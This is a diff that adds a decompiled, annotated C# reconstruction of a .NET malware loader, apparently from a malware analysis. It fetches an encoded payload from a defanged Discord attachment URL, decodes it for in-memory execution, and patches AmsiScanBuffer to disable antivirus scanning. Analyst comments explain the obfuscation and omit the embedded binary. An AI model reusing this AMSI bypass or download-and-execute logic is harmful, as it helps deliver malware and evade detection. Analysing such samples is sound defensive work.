@@ -1,0 +1,181 @@
+using System;
+using System.IO;
+using System.Net;
+using System.Text.RegularExpressions;
+using System.Runtime.CompilerServices;
+
+using Microsoft.VisualBasic.CompilerServices;
+
+public class F08B2UnZ
+{
+  public static void Main()
+  {
+    ServicePointManager.set_Expect100Continue(true);
+    ServicePointManager.set_SecurityProtocol(0xC0);
+    new Yd67bU30().OPf84m5();
+  }
+}
+
+public class Yd67bU30
+{
+  public void OPf84m5()
+  {
+    var local_0 = new cInteraction();
+    var local_1 = new StringBuilder();
+    var local_2 = new WebClient();
+    var local_3 = new JZ385();
+    local_3.N3b1K1G0();
+
+    var local_4 = cInteraction.F30.Contains("|");
+    var local_14 = local_4;
+
+    if(local_14)
+    {
+      // Inst 23
+      /**
+       * Not used in this sample. Ignored.
+       */
+    }
+    else
+    {
+      // Inst 72
+      /* Microsoft.VisualBasic.CompilerServices.Conversions::ToString(...) */
+      /* Input string literal decodes to "DownloadString" */
+      var local_21 = Conversions.ToString(local_0.CJcezfdp(local_2, "13432D45435o4365w65n46l575o75a4d56S3t5435r4i5n6546g53523423", 2, new object[]{local_0.F30}));
+      local_1.Append(local_21);
+    }
+
+    var local_5 = local_1.ToString().split(new char[]{0x2D});
+    var local_6 = local_5[0];
+    var local_7 = local_5[1];
+
+    var local_22 = Enumerable.Count<char>(local_6);
+    var local_23 = 0;
+    
+    // Inst 116
+    while(local_23 <= local_22)
+    {
+      // Inst 117
+      /* Microsoft.VisualBasic.CompilerServices.Conversions::ToString(...) */
+      /* Input string literal decodes to "Replace" */
+      local_7 = Conversions.ToString(local_0.CJcezfdp(local_7, "12[3R14e34]p32[5l25245]43a534543[c6365654e]65454", 2, new object[]{local_6.get_Chars(local_23), local_23}));
+      local_23++;
+    }
+
+    // Inst 145
+    var local_8 = new MemoryStream();
+    var local_25 = local_7.split(new char[]{0x20});
+    var local_26 = 0;
+
+    // Inst 166 to 195
+    var local_31;
+    while(local_31 = (local_26 < local_25.Length))
+    {
+      // Inst 167
+      var local_27 = local_25[local_26];
+      var local_28 = local_27.get_Length() > 0;
+      if(local_28)
+      {
+        // Inst 177
+        var local_29 = Convert.ToInt32(local_27);
+        var local_30 = Convert.ToByte(local_29);
+        local_8.WriteByte(local_30);
+      }
+
+      // Inst 189
+      local_26++;
+    }
+
+    // Inst 203
+    /* System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(...) */
+    /* Input string literal decodes to "GetType" */
+    var local_9 = RuntimeHelpers.GetObjectValue(local_0.CJcezfdp(local_2, "G65[756e876]8t768[5T657y45]6p435[45e42]", 2, new object[0]));
+
+    // Inst 212
+    /**
+     * The instructions beyond this point just loads the content of local_8 as an MSIL assembly and execute the malicious content.
+     */
+  }
+}
+
+public class JZ385
+{
+  /**
+   * Seems to be heavily obfuscated snippet used to bypass Antimalware Scan Interface (AMSI)
+   */
+  public void N3b1K1G0()
+  {
+    var local_0 = new N7cU6bLk();
+
+    /* Input string literal decodes to "amsi.dll" */
+    var local_1 = N7cU6bLk.R488r2e(cInteraction.X2aKb3J6("121312432/4322543=53436a546454_61765m726579563876[87469s1i2.3]4[1d236l431l2374"), IntPtr.Zero, 0);
+    var local_2 = IntPtr.op_Inequality(local_1, IntPtr.Zero);
+    if(local_2)
+    {
+      /* Input string literal decodes to "AmsiScanBuffer" */
+      var local_3 = cInteraction.X2aKb3J6("109=7928A96738/564754m64156]45263s5334'5344534i54135S242c324323a4[1[2n3]4B1[2[3u4f1f2]3]4[1e23]43122r3");
+      var local_4 = 0;
+      var local_5 = 0;
+      var local_6 = new MemoryStream();
+      local_6.WriteByte(0xB8);
+      local_6.WriteByte(0x57);
+      local_6.WriteByte(0x00);
+      local_6.WriteByte(0x07);
+      local_6.WriteByte(0x80);
+      local_6.WriteByte(0xC2);
+      local_6.WriteByte(0x18);
+      local_6.WriteByte(0x00);
+      var local_7 = local_6.ToArray();
+      var local_8 = UIntPtr.op_Explicit((uint64)local_7.Length);
+      
+      local_0.Ebr6f30b(local_3, local_8, 0x40, &local_4);
+      local_0.Fx9s05K(local_7, 0, local_3, (int32)local_7.length);
+      local_0.Ebr6f30b(local_3, local_8, local_4, &local_5);
+    }
+  }
+}
+
+public class N7cU6bLk
+{
+  public var I16fUlF;
+
+  public N7cU6bLk()
+  {
+    I16fUlF = new byte[0x2200] {/* PE DATA (extract.dll) OMITTED */};
+  }
+}
+
+public class cInteraction
+{
+  /* Encoded malware payload hosted on Discord. */
+  // [WARNING] Live malware ahead! Do NOT download the linked file unless you know what you're doing!
+  public string F30 = "hxxps://cdn.discordapp[.]com/attachments/893177342426509335/902143329544859648/A0E28ADF.jpg";
+
+  /**
+   * This string obfuscation function essentially just retains chars in the set "a-zA-Z.," in a string and returns the truncated string.
+   */
+  public static string X2aKb3J6(string arg_0)
+  {
+    var local_1 = String.Empty;
+    var local_2 = new Regex("([a-zA-Z.,]*)").Matches(arg_0).GetEnumerator();
+
+    var local_4;
+    while(local_4 = local_2.MoveNext())
+    {
+      var local_3 = (Match)local_2.get_Current();
+      local_1 = String.Concat(local_1, local_3.get_Groups().get_Item(1).get_Value());
+    }
+    
+    var local_0 = local_1;
+    return local_0;
+  }
+
+  // arg_0 = this
+  public object CJcezfdp(object arg_1, string arg_2, int arg_3, object[] arg_4)
+  {
+    /* System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(...) */
+    /* Microsoft.VisualBasic.CompilerServices.Versioned::CallByName(...) */
+    var local_0 = Versioned.CallByName(RuntimeHelpers.GetObjectValue(arg_1), X2aKb3J6(arg_2), arg_3, arg_4);
+    return local_0;
+  }
+}
